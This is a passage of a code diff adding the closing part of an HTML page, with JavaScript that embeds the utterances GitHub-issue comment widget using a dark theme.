+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
